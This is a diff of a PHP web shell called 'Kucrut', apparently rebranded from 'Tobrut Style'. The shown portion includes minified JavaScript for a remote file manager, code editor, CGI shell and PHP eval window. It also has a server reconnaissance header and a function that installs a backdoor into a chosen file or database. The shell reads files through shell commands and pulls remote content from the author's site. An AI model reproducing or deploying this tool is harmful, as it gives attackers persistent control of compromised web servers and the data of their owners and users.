l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".kucrut-ajax-error").innerHTML=e+" ( "+t+firewall+" )",kucrutShowNotification(t,"Ajax","error"))}}function kucrutInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){kucrutFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;kucrutSortMenuItems(["newtab"]),kucrutRightClickMenu(i,l),e.preventDefault()})})}function kucrutRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function kucrutSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function kucrutAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=kucrut_ace_editors.editor;"eval"==i&&(l=kucrut_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("kucrut_ace_"+a+"_"+i,t,2012)}function kucrutAceChangeWrapMode(e,a){var t=kucrut_ace_editors.editor;"eval"==a&&(t=kucrut_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function kucrutAceChangeFontSize(e,a,t){var i=kucrut_ace_editors.editor;"eval"==e&&(i=kucrut_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("kucrut_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=kucrut_ace_editors.editor&&null!=kucrut_ace_editors.editor){for(var a in kucrut_ace_editors.editor)kucrut_ace_editors.editor[a].destroy();kucrut_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=kucrut_ace_editors.eval){for(var a in kucrut_ace_editors.eval)kucrut_ace_editors.eval[a].destroy();kucrut_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("kucrut_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return kucrutSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=kucrutb64(t)),void 0!==l&&null!=l&&0!=l.length)n=kucrutb64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=kucrutb64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='https://kucrut.xyz/images/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),kucrutloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?kucrutloader(b,"block"):(kucrutloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+kucrutb64("FilesTools")+"&c="+kucrutb64(f)+"&kucrut1="+kucrutb64(e)+"&kucrut2="+kucrutb64(a)+"&kucrut3="+r+"&kucrut4="+n+"&kucrut5=&kucrut6=&kucrut7=&kucrut8=&kucrut9=&kucrut10=&&ajax="+kucrutb64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),kucrutShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&kucrutUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?kucrutLoaderOnTop("none"):kucrutloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&kucrutShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&kucrutShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),kucrutLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function kucrutLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("kucrut-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="kucrut-ace-plugin",t.onload=function(){kucrutLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==kucrut_ace_editors.editor&&(kucrut_ace_editors.editor={});var i=getCookie("kucrut_ace_theme_editor"),l=getCookie("kucrut_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),kucrut_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),kucrut_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),kucrut_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),kucrut_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),kucrut_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),kucrut_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),kucrut_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){kucrut_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==kucrut_ace_editors.eval&&(kucrut_ace_editors.eval={});i=getCookie("kucrut_ace_theme_eval"),l=getCookie("kucrut_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),kucrut_ace_editors.eval["phpeval-"+o]=ace.edit(t),kucrut_ace_editors.eval["phpeval-"+o].setReadOnly(a),kucrut_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),kucrut_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),kucrut_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),kucrut_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){kucrut_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+kucrutb64("checkfiletype")+"&path="+kucrutb64(editor_files[t].pwd)+"&arg="+kucrutb64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","kucrut","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="https://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("kucrut_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=kucrut_ace_editors.editor[e].selection.toJSON();kucrut_ace_editors.editor[e].selectAll(),kucrut_ace_editors.editor[e].focus(),document.execCommand("copy"),kucrut_ace_editors.editor[e].selection.fromJSON(a),kucrutShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=kucrutb64(e,!0),a=kucrutb64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return kucrutb64(i,!0)}function reloadSetting(e){return kucrutloader(kucrut_before_do_action_id,"block"),_Ajax(d.URL,"a="+kucrutb64("settings")+"&kucrut1="+kucrutb64(e.protect.value)+"&kucrut2="+kucrutb64(e.lgpage.value)+"&kucrut3="+kucrutb64(e.username.value)+"&kucrut4="+kucrutb64(e.password.value)+"&kucrut5="+kucrutb64(">>")+"&kucrut6="+kucrutb64(e.icon.value)+"&kucrut7="+kucrutb64(e.post_encrypt.value)+"&kucrut8="+kucrutb64("main")+"&kucrut9="+kucrutb64(e.cgi_api.value)+"&c="+kucrutb64(c_)+"&ajax="+kucrutb64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),kucrutloader(a,"none")},!1,kucrut_before_do_action_id),kucrut_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+kucrutb64("settings")+"&kucrut1="+kucrutb64(JSON.stringify(a))+"&kucrut2="+kucrutb64(">>")+"&kucrut3="+kucrutb64(t)+"&kucrut8="+kucrutb64("color")+"&c="+kucrutb64(c_)+"&ajax="+kucrutb64("true"),function(e){evalJS(e)},!0)}function kucrutb64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __HOST_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=kucrut_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+kucrutb64("cgishell")+"&kucrut1="+kucrutb64(e)+"&ajax="+kucrutb64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
 </script>
 <?php echo"<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
 <input type='hidden' name='a' value='dlfile'>
@@ -1471,7 +1471,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="Tobrut Style 2012" draggable="false" src="https://res.cloudinary.com/dzujj1seq/image/upload/v1719811646/SEOTOBRUT_kx1nyj.png" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="kucrut team 2012" draggable="false" src="https://res.cloudinary.com/dzujj1seq/image/upload/v1719811646/SEOTOBRUT_kx1nyj.png" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
@@ -1545,7 +1545,7 @@ echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Kucrut_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="kucrut_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Tobrut Style</font></span></a></center></div></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="kucrut_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Kucrut Team</font></span></a></center></div></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
@@ -1593,22 +1593,22 @@ unset($_COOKIE['KucrutUser'],$_COOKIE['KucrutPass']);
 echo("ok");
 }
 function showAnimation($name){
-	return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
+    return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
 }
 function __showicon($r){
-	$s['btn']='https://solevisible.com/images/btn.png';
-	$s['kucrutmini']='https://solevisible.com/images/alfamini.png';
-	$s['loader']='https://iili.io/2M3GdE7.png';
-	//return 'data:image/png;base64,'.__get_resource($s[$r]);
-	return $s[$r];
+    $s['btn']='https://solevisible.com/images/btn.png';
+    $s['kucrutmini']='https://solevisible.com/images/alfamini.png';
+    $s['loader']='https://iili.io/2M3GdE7.png';
+    //return 'data:image/png;base64,'.__get_resource($s[$r]);
+    return $s[$r];
 }
 function kucrutinbackdoor(){
 kucruthead();
 echo '<div class=header><center><p><div class="txtfont_header">| Install BackDoor |</div></p><h3><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'file\')">| In File | </a><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'db\')">| In DataBase | </a></h3></center>';
 $error = '<font color="red">Error In Inject BackDoor...!<br>File Loader is not Writable Or Not Exists...!</font>';
 $success= '<font color="green">Success...!';
-$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Kucrut x Tobrut Style is Here...!');\n?></textarea></p></div>";
-$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='kucrut'>Kucrut x Tobrut Style Uploader</option><option value='my'>My Private Shell</option></select>";
+$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Kucrut x Kucrut Team is Here...!');\n?></textarea></p></div>";
+$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='kucrut'>Kucrut x Kucrut Team Uploader</option><option value='my'>My Private Shell</option></select>";
 $cwd = 'Example: /home/kucrut/public_html/index.php';
 if($_POST['kucrut1']=='file'){
 echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='kucrut'> <input type='submit' value=' '>{$textarea}</form></p></center>");
@@ -1721,8 +1721,8 @@ return false;
 }
 function clean_string($string){
   if(function_exists("iconv")){
-	  $s = trim($string);
-	  $s = iconv("UTF-8", "UTF-8//IGNORE", $s);
+      $s = trim($string);
+      $s = iconv("UTF-8", "UTF-8//IGNORE", $s);
   }
   return $s;
 }
@@ -1736,7 +1736,7 @@ $content .= $boom ? clean_string(fread($fh, 8192)) : fread($fh, 8192);
 @fclose($fh);
 }
 if(empty($content)||!$content){
-	$content = kucrutEx("cat '".addslashes($file)."'");
+    $content = kucrutEx("cat '".addslashes($file)."'");
 }
 return $content;
 }
@@ -1747,12 +1747,12 @@ $content = $curl->Send("https://solevisible.com/market.php");
 $data = @json_decode($content, true);
 if(!empty($data)){
 if($data["status"] == "open"){
-	echo $data["content"];
+    echo $data["content"];
 }else{
-	echo $data["error_msg"];
+    echo $data["error_msg"];
 }
 }else{
-	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the kucrut market....! try later.</div>";
+    echo "<div style='text-align:center;font-size:20px;'>Cant connect to the kucrut market....! try later.</div>";
 }
 echo "</div>";
 }
@@ -1847,69 +1847,69 @@ echo '<table border="1"><tbody>';
 $template = '<tr><td style="text-align:center;"><a href="https://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
 $x = 1;
 foreach($GLOBALS['__HOST_COLOR__'] as $key => $value){
-	$multi = "";
-	if(is_array($value)){
-		if(isset($value["multi_selector"])){
-			$multi = __ZW5jb2Rlcg(json_encode($value));
-		}
-	}
-	$value = kucrut_getColor($key);
-	$help = strtolower(str_replace(array(":", "+"), array("_", "_plus"), $key));
-	echo str_replace(array("{index}", "{target}", "{color}", "{multi}", "{help}"), array($x++, $key, $value, $multi, $help), $template);
+    $multi = "";
+    if(is_array($value)){
+        if(isset($value["multi_selector"])){
+            $multi = __ZW5jb2Rlcg(json_encode($value));
+        }
+    }
+    $value = kucrut_getColor($key);
+    $help = strtolower(str_replace(array(":", "+"), array("_", "_plus"), $key));
+    echo str_replace(array("{index}", "{target}", "{color}", "{multi}", "{help}"), array($x++, $key, $value, $multi, $help), $template);
 }
 echo '<tr><td style="text-align:center;">-</td><td style="text-align:center;"><div class="tbltxt">*</div></td><td><div style="margin-left:5px;" class="tbltxt">Use Default Color:</div></td><td></td><td><center><input type="checkbox" id="use_default_color" value="1"></center></td></tr>';
 
 echo '</tbody></table><p><input type="submit" name="btn" value=" "></p></form><p><button style="padding:4px;;margin-right:20px;" onclick="$(\'importFileBtn\').click();" class="button"> Import </button> <button style="padding:4px;margin-left:20px;" onclick="g(\'settings\',null,null,null,null,null,null,null,\'export\',\'color\')" class="button"> Export </button></center></p>';
 if($_POST['kucrut7']=='export'){
-	echo __pre();
-	$colors = is_array($GLOBALS["DB_NAME"]["color"])?$GLOBALS["DB_NAME"]["color"]:array();
-	$glob_colors = $GLOBALS["__HOST_COLOR__"];
-	$array = array();
-	foreach($glob_colors as $k => $v){
